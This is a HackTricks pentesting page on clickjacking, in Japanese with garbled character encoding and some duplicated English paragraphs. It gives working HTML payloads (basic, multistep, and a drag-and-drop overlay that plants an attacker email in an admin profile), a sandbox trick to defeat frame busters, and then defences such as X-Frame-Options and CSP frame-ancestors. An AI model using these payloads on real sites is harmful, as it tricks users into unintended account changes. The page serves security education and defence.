# ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)ã‚’ä½¿ç”¨ã—ã¦ã€ä¸–ç•Œã§æœ€ã‚‚é«˜åº¦ãªã‚³ãƒŸãƒ¥ãƒ‹ãƒ†ã‚£ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã£ã¦å¼·åŒ–ã•ã‚ŒãŸãƒ¯ãƒ¼ã‚¯ãƒ•ãƒ­ãƒ¼ã‚’ç°¡å˜ã«æ§‹ç¯‰ã—ã¦**è‡ªå‹•åŒ–**ã§ãã¾ã™ã€‚\
ä»Šã™ãã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã¨ã¯

ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‚’**é¨™ã—ã¦**åˆ¥ã®è¦ç´ ã¨ã—ã¦**è¦‹ãˆãªã„**ã¾ãŸã¯åˆ¥ã®è¦ç´ ã«å½è£…ã•ã‚ŒãŸã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã®**è¦ç´ **ã‚’**ã‚¯ãƒªãƒƒã‚¯**ã•ã›ã‚‹æ”»æ’ƒã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯çŸ¥ã‚‰ãšã«ãƒãƒ«ã‚¦ã‚§ã‚¢ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã€æ‚ªæ„ã®ã‚ã‚‹ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã‚’è¨ªã‚ŒãŸã‚Šã€è³‡æ ¼æƒ…å ±ã‚„æ©Ÿå¯†æƒ…å ±ã‚’æä¾›ã—ãŸã‚Šã€ãŠé‡‘ã‚’é€é‡‘ã—ãŸã‚Šã€ã‚ªãƒ³ãƒ©ã‚¤ãƒ³ã§å•†å“ã‚’è³¼å…¥ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼ˆ[ã“ã“ã‹ã‚‰](https://www.imperva.com/learn/application-security/clickjacking/)ï¼‰ã€‚

### ãƒ•ã‚©ãƒ¼ãƒ ã®äº‹å‰å…¥åŠ›ãƒˆãƒªãƒƒã‚¯

æ™‚ã«ã¯ã€ãƒšãƒ¼ã‚¸ã®èª­ã¿è¾¼ã¿æ™‚ã«GETãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚©ãƒ¼ãƒ ã®ãƒ•ã‚£ãƒ¼ãƒ«ãƒ‰ã®å€¤ã‚’**è‡ªå‹•çš„ã«å…¥åŠ›**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦ã€ãƒ•ã‚©ãƒ¼ãƒ ã«ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’å…¥åŠ›ã—ã€ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’é€ä¿¡ã—ã¦ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒãƒœã‚¿ãƒ³ã‚’æŠ¼ã™ã‚ˆã†ã«ã—ã¾ã™ã€‚

### ãƒ‰ãƒ©ãƒƒã‚°ï¼†ãƒ‰ãƒ­ãƒƒãƒ—ã§ãƒ•ã‚©ãƒ¼ãƒ ã‚’å…¥åŠ›ã™ã‚‹

ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ãƒ•ã‚©ãƒ¼ãƒ ã‚’**å…¥åŠ›**ã—ã¦ã‚‚ã‚‰ã„ãŸã„ãŒã€ç‰¹å®šã®æƒ…å ±ï¼ˆãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚„ç‰¹å®šã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ï¼‰ã‚’ç›´æ¥å°‹ã­ã‚‹ã“ã¨ã¯ã—ãŸããªã„å ´åˆã¯ã€[**ã“ã®ä¾‹**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/)ã®ã‚ˆã†ã«ã€åˆ¶å¾¡ã•ã‚ŒãŸãƒ‡ãƒ¼ã‚¿ã‚’æ›¸ãè¾¼ã‚€ä½•ã‹ã‚’**ãƒ‰ãƒ©ãƒƒã‚°ï¼†ãƒ‰ãƒ­ãƒƒãƒ—**ã™ã‚‹ã‚ˆã†ã«ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«ä¾é ¼ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### åŸºæœ¬çš„ãªãƒšã‚¤ãƒ­ãƒ¼ãƒ‰
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### ãƒãƒ«ãƒã‚¹ãƒ†ãƒƒãƒ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

In some cases, a simple clickjacking attack may not be enough to achieve the desired outcome. In such situations, a multistep payload can be used to execute a series of actions on the victim's behalf.

ã„ãã¤ã‹ã®å ´åˆã«ãŠã„ã¦ã€å˜ç´”ãªã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°æ”»æ’ƒã§ã¯æœ›ã¾ã—ã„çµæœã‚’å¾—ã‚‹ã“ã¨ãŒã§ããªã„ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ãã®ã‚ˆã†ãªçŠ¶æ³ã§ã¯ã€ãƒãƒ«ãƒã‚¹ãƒ†ãƒƒãƒ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€è¢«å®³è€…ã®ä»£ã‚ã‚Šã«ä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

The idea behind a multistep payload is to trick the victim into performing a series of actions that they may not have intended to do. This can be achieved by overlaying multiple transparent iframes on top of each other, each containing a different target element.

ãƒãƒ«ãƒã‚¹ãƒ†ãƒƒãƒ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚¢ã‚¤ãƒ‡ã‚¢ã¯ã€è¢«å®³è€…ã‚’é¨™ã—ã¦æ„å›³ã—ãªã‹ã£ãŸä¸€é€£ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ã€é€æ˜ãªè¤‡æ•°ã®iframeã‚’é‡ã­åˆã‚ã›ã€ãã‚Œãã‚ŒãŒç•°ãªã‚‹ã‚¿ãƒ¼ã‚²ãƒƒãƒˆè¦ç´ ã‚’å«ã‚“ã§ã„ã‚‹ã“ã¨ã«ã‚ˆã£ã¦å®Ÿç¾ã§ãã¾ã™ã€‚

When the victim clicks on the visible target element, they are actually clicking on the hidden target element in the iframe below. This can be repeated multiple times, creating a chain of actions that the victim unknowingly performs.

è¢«å®³è€…ãŒè¡¨ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚¿ãƒ¼ã‚²ãƒƒãƒˆè¦ç´ ã‚’ã‚¯ãƒªãƒƒã‚¯ã™ã‚‹ã¨ã€å®Ÿéš›ã«ã¯ä¸‹ã®iframeå†…ã®éè¡¨ç¤ºã®ã‚¿ãƒ¼ã‚²ãƒƒãƒˆè¦ç´ ã‚’ã‚¯ãƒªãƒƒã‚¯ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã‚’è¤‡æ•°å›ç¹°ã‚Šè¿”ã™ã“ã¨ã§ã€è¢«å®³è€…ãŒçŸ¥ã‚‰ãšã«å®Ÿè¡Œã™ã‚‹ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã®é€£é–ã‚’ä½œæˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

By carefully designing the multistep payload, an attacker can manipulate the victim into performing actions such as submitting forms, making purchases, or even granting permissions that they would not have done willingly.

ãƒãƒ«ãƒã‚¹ãƒ†ãƒƒãƒ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ³¨æ„æ·±ãè¨­è¨ˆã™ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯è¢«å®³è€…ã«å¯¾ã—ã¦ã€ãƒ•ã‚©ãƒ¼ãƒ ã®é€ä¿¡ã€è³¼å…¥ã®å®Ÿè¡Œã€ã•ã‚‰ã«ã¯æ„å›³çš„ã«è¡Œã‚ãªã‹ã£ãŸæ¨©é™ã®ä»˜ä¸ãªã©ã®ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

It is important to note that multistep payloads can be more complex to implement and may require additional knowledge of the target application's functionality and behavior.

ãƒãƒ«ãƒã‚¹ãƒ†ãƒƒãƒ—ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯å®Ÿè£…ãŒã‚ˆã‚Šè¤‡é›‘ã§ã‚ã‚Šã€å¯¾è±¡ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®æ©Ÿèƒ½ã¨å‹•ä½œã«é–¢ã™ã‚‹è¿½åŠ ã®çŸ¥è­˜ãŒå¿…è¦ãªå ´åˆãŒã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### ãƒ‰ãƒ©ãƒƒã‚°ï¼†ãƒ‰ãƒ­ãƒƒãƒ— + ã‚¯ãƒªãƒƒã‚¯ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰

Clickjacking attacks can be enhanced by combining them with drag and drop functionality. This technique involves tricking the user into dragging and dropping an element onto a hidden button or link, which triggers a malicious action without the user's knowledge.

To perform a drag and drop + click attack, follow these steps:

1. Identify the target element: Find the element that you want the user to interact with, such as a button or link.

2. Create a hidden button or link: Create a hidden button or link that will be triggered when the user drags and drops the target element onto it. This can be done by positioning the button or link off-screen or using CSS to hide it.

3. Implement the drag and drop functionality: Use JavaScript to enable drag and drop functionality on the target element. This can be done using the HTML5 Drag and Drop API or a JavaScript library like jQuery UI.

4. Handle the drop event: When the user drops the target element onto the hidden button or link, handle the drop event and trigger the desired action. This can be done by attaching an event listener to the hidden button or link.

5. Test the attack: Test the attack by interacting with the target element and verifying that the malicious action is triggered.

By combining drag and drop functionality with clickjacking, attackers can increase the effectiveness of their attacks and deceive users into performing unintended actions. It is important for developers to be aware of this technique and implement appropriate security measures to prevent clickjacking attacks.
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°

ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒã‚¯ãƒªãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚‹ **XSS æ”»æ’ƒ** ã‚’ç‰¹å®šã—ã€ãƒšãƒ¼ã‚¸ãŒ **ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã®è„†å¼±æ€§** ã‚’æŒã£ã¦ã„ã‚‹å ´åˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’é¨™ã—ã¦ãƒœã‚¿ãƒ³/ãƒªãƒ³ã‚¯ã‚’ã‚¯ãƒªãƒƒã‚¯ã•ã›ã‚‹ã“ã¨ã§æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ä¾‹:\
_ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ä¸€éƒ¨ã®ãƒ—ãƒ©ã‚¤ãƒ™ãƒ¼ãƒˆãªè©³ç´°æƒ…å ±ï¼ˆã‚ãªãŸã ã‘ãŒè¨­å®šãŠã‚ˆã³èª­ã¿å–ã‚Šå¯èƒ½ãªè©³ç´°æƒ…å ±ï¼‰ã« **ã‚»ãƒ«ãƒ• XSS** ã‚’è¦‹ã¤ã‘ã¾ã—ãŸã€‚ã“ã‚Œã‚‰ã®è©³ç´°ã‚’è¨­å®šã™ã‚‹ãŸã‚ã®ãƒšãƒ¼ã‚¸ã¯ **ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã®è„†å¼±æ€§** ã‚’æŒã£ã¦ãŠã‚Šã€GET ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§ **ãƒ•ã‚©ãƒ¼ãƒ ** ã‚’ **äº‹å‰ã«å…¥åŠ›** ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚_\
\_\_æ”»æ’ƒè€…ã¯ã€ãã®ãƒšãƒ¼ã‚¸ã«å¯¾ã—ã¦ **ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°æ”»æ’ƒ** ã‚’æº–å‚™ã—ã€**XSS ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰** ã‚’ **ãƒ•ã‚©ãƒ¼ãƒ ** ã« **äº‹å‰ã«å…¥åŠ›** ã—ã¦ **ãƒ¦ãƒ¼ã‚¶ãƒ¼** ã‚’ **ãƒ•ã‚©ãƒ¼ãƒ ã‚’é€ä¿¡** ã™ã‚‹ã‚ˆã†ã« **é¨™ã™** ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®ãŸã‚ã€**ãƒ•ã‚©ãƒ¼ãƒ ãŒé€ä¿¡ã•ã‚Œã‚‹ã¨** å€¤ãŒå¤‰æ›´ã•ã‚Œã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ XSS ã‚’å®Ÿè¡Œ** ã—ã¾ã™ã€‚

## ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã‚’å›é¿ã™ã‚‹æ–¹æ³•

### ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã®é˜²å¾¡ç­–

ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°ã‚’é˜²ããŸã‚ã«ã€ã‚¯ãƒ©ã‚¤ã‚¢ãƒ³ãƒˆå´ã§ä»¥ä¸‹ã®å‹•ä½œã‚’è¡Œã†ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

* ç¾åœ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ãŒãƒ¡ã‚¤ãƒ³ã¾ãŸã¯ãƒˆãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã‚ã‚‹ã“ã¨ã‚’ç¢ºèªãŠã‚ˆã³å¼·åˆ¶ã™ã‚‹
* ã™ã¹ã¦ã®ãƒ•ãƒ¬ãƒ¼ãƒ ã‚’è¡¨ç¤ºã™ã‚‹
* ä¸å¯è¦–ãƒ•ãƒ¬ãƒ¼ãƒ ã‚’ã‚¯ãƒªãƒƒã‚¯ã§ããªã„ã‚ˆã†ã«ã™ã‚‹
* ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å¯¾ã—ã¦æ½œåœ¨çš„ãªã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°æ”»æ’ƒã‚’æ¤œå‡ºãŠã‚ˆã³é€šçŸ¥ã™ã‚‹

#### ãƒã‚¤ãƒ‘ã‚¹

ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¹ã‚¿ãƒ¼ã¯ JavaScript ã§ã‚ã‚‹ãŸã‚ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¨­å®šã«ã‚ˆã£ã¦ãã®å‹•ä½œãŒé˜»æ­¢ã•ã‚Œã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚ã¾ãŸã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒ JavaScript ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„å ´åˆã‚‚ã‚ã‚Šã¾ã™ã€‚ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¹ã‚¿ãƒ¼ã«å¯¾ã™ã‚‹åŠ¹æœçš„ãªæ”»æ’ƒè€…ã®å›é¿ç­–ã¯ã€**HTML5 ã® iframe `sandbox` å±æ€§** ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã®å±æ€§ã‚’ `allow-forms` ã¾ãŸã¯ `allow-scripts` ã®å€¤ã§è¨­å®šã—ã€`allow-top-navigation` ã®å€¤ã‚’çœç•¥ã™ã‚‹ã¨ã€ãƒ•ãƒ¬ãƒ¼ãƒ ãƒã‚¹ã‚¿ãƒ¼ã‚¹ã‚¯ãƒªãƒ—ãƒˆã¯ä¸­æ–­ã•ã‚Œã¾ã™ã€‚ãªãœãªã‚‰ã€iframe ã¯è‡ªèº«ãŒãƒˆãƒƒãƒ—ã‚¦ã‚£ãƒ³ãƒ‰ã‚¦ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’ãƒã‚§ãƒƒã‚¯ã§ããªã„ã‹ã‚‰ã§ã™ã€‚
```markup
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
`allow-forms`ã¨`allow-scripts`ã®ä¸¡æ–¹ã®å€¤ã¯ã€iframeå†…ã§æŒ‡å®šã•ã‚ŒãŸã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¨±å¯ã—ã¾ã™ãŒã€ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ã®ãƒŠãƒ“ã‚²ãƒ¼ã‚·ãƒ§ãƒ³ã¯ç„¡åŠ¹ã«ãªã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã‚µã‚¤ãƒˆå†…ã®æ©Ÿèƒ½ã¯è¨±å¯ã•ã‚Œã¾ã™ãŒã€ãƒ•ãƒ¬ãƒ¼ãƒ ã®ç ´å£Šè¡Œç‚ºã¯é˜²æ­¢ã•ã‚Œã¾ã™ã€‚

å®Ÿè¡Œã™ã‚‹Clickjackingæ”»æ’ƒã®ã‚¿ã‚¤ãƒ—ã«ã‚ˆã£ã¦ã¯ã€`allow-same-origin`ã¨`allow-modals`ã€ã¾ãŸã¯[ã•ã‚‰ã«å¤šãã®è¨­å®š](https://www.w3schools.com/tags/att\_iframe\_sandbox.asp)ãŒå¿…è¦ã«ãªã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ã€‚æ”»æ’ƒã‚’æº–å‚™ã™ã‚‹éš›ã«ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ã®ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‚’ç¢ºèªã—ã¦ã€ä»–ã®è¨­å®šãŒå¿…è¦ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

### X-Frame-Options

**`X-Frame-Options` HTTPãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒ˜ãƒƒãƒ€ãƒ¼**ã¯ã€ãƒ–ãƒ©ã‚¦ã‚¶ãŒãƒšãƒ¼ã‚¸ã‚’`<frame>`ã¾ãŸã¯`<iframe>`ã§ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¤ºã™ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã‚µã‚¤ãƒˆã¯ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ã€**è‡ªèº«ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ãŒä»–ã®ã‚µã‚¤ãƒˆã«åŸ‹ã‚è¾¼ã¾ã‚Œãªã„ã‚ˆã†ã«**ã™ã‚‹ã“ã¨ã§ã€Clickjackingæ”»æ’ƒã‚’å›é¿ã§ãã¾ã™ã€‚ã™ã¹ã¦ã®HTMLã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’å«ã‚€ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«å¯¾ã—ã¦**`X-Frame-Options`ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®š**ã—ã¾ã™ã€‚å¯èƒ½ãªå€¤ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ã€‚

* `X-Frame-Options: deny`ã¯ã€**ã©ã®ãƒ‰ãƒ¡ã‚¤ãƒ³ã‹ã‚‰ã‚‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã®ãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã‚’é˜²æ­¢**ã—ã¾ã™ï¼ˆæ¨å¥¨å€¤ï¼‰
* `X-Frame-Options: sameorigin`ã¯ã€**ç¾åœ¨ã®ã‚µã‚¤ãƒˆã®ã¿**ãŒã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’ãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
* `X-Frame-Options: allow-from https://trusted.com`ã¯ã€æŒ‡å®šã•ã‚ŒãŸã€Œuriã€ãŒã“ã®ãƒšãƒ¼ã‚¸ã‚’ãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
* ãƒ–ãƒ©ã‚¦ã‚¶ãŒã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„å ´åˆã€ã“ã‚Œã¯**ã‚ªãƒ¼ãƒ—ãƒ³ã«å¤±æ•—ã—ã¾ã™**ã®ã§ã€ä»¥ä¸‹ã®åˆ¶é™ã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚
* ä»–ã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯æ–°ã—ã„**CSP frame-ancestorsãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–**ã‚‚ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚ä¸€éƒ¨ã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ä¸¡æ–¹ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã™ã€‚

### Content Security Policyï¼ˆCSPï¼‰frame-ancestorsãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–

æ¨å¥¨ã•ã‚Œã‚‹Clickjackingä¿è­·ã¯ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®Content Security Policyã«**`frame-ancestorsãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–`**ã‚’çµ„ã¿è¾¼ã‚€ã“ã¨ã§ã™ã€‚\
**`frame-ancestors 'none'`**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**X-Frame-Options `deny`**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¨åŒæ§˜ã®å‹•ä½œã‚’ã—ã¾ã™ï¼ˆèª°ã‚‚ãƒšãƒ¼ã‚¸ã‚’ãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã§ãã¾ã›ã‚“ï¼‰ã€‚\
**`frame-ancestors 'self'`**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**X-Frame-Options `sameorigin`**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¨ã»ã¼åŒç­‰ã§ã™ï¼ˆç¾åœ¨ã®ã‚µã‚¤ãƒˆã®ã¿ãŒãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã§ãã¾ã™ï¼‰ã€‚\
**`frame-ancestors trusted.com`**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¯ã€**X-Frame-Options** `allow-from`ãƒ‡ã‚£ãƒ¬ã‚¯ãƒ†ã‚£ãƒ–ã¨ã»ã¼åŒç­‰ã§ã™ï¼ˆä¿¡é ¼ã•ã‚ŒãŸã‚µã‚¤ãƒˆã®ã¿ãŒãƒ•ãƒ¬ãƒ¼ãƒ åŒ–ã§ãã¾ã™ï¼‰ã€‚

